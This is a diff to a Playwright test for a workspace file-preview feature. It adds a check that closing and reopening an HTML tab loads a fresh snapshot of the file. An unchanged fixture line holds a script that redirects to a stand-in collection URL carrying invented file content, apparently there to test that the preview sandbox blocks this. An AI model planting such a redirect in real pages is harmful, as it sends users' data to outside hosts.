@@ -202,6 +202,7 @@ parent.postMessage({kind:"frame-ready"}, "*");
 </script></body>`);
 fs.writeFileSync(path.join(folder, "navigation.html"), `<script>parent.postMessage({kind:"invented-navigation-script"}, "*"); location.href = "https://example.invalid/collect?data=invented-file-content"</script>`);
 fs.writeFileSync(path.join(folder, "stalled.html"), "<p>Invented stalled snapshot</p>");
+fs.writeFileSync(path.join(folder, "reopen.html"), "<p>Invented first HTML incarnation</p>");
 const observedFiles = ["photo.png", "report.pdf", "report.docx", "sample.xlsx", "large.svg", "notes.md"];
 const digest = (name: string) => createHash("sha256").update(fs.readFileSync(path.join(folder, name))).digest("hex");
 const originalDigests = new Map(observedFiles.map((name) => [name, digest(name)]));
@@ -638,6 +639,16 @@ try {
             await page.unroute("**/workspace-preview?*");
             await page.evaluate(() => (window as any).restoreHtmlTimeout());
         }
+        let reopenedHtmlReads = 0;
+        page.on("request", (request) => { const url = new URL(request.url()); if (url.pathname.endsWith("/workspace-preview") && url.searchParams.get("path") === "reopen.html" && url.searchParams.get("frame") !== "1") reopenedHtmlReads++; });
+        await treeFile("reopen.html").click();
+        await page.frameLocator('.workspace-preview-html iframe[title="reopen.html"]').getByText("Invented first HTML incarnation").waitFor();
+        fs.writeFileSync(path.join(folder, "reopen.html"), "<p>Invented second HTML incarnation</p>");
+        await tab("reopen.html").locator(".workspace-tab-close").click();
+        await treeFile("reopen.html").click();
+        await page.frameLocator('.workspace-preview-html iframe[title="reopen.html"]').getByText("Invented second HTML incarnation").waitFor();
+        assert(reopenedHtmlReads === 2, "closing the HTML tab ends its retained snapshot before a new incarnation opens");
+        await tab("reopen.html").locator(".workspace-tab-close").click();
         previewRequests = 0;
 		await treeFile("notes.md").click();
 		await page.locator(".markdown-editor-tiptap .ProseMirror").waitFor({ timeout: 20_000 });
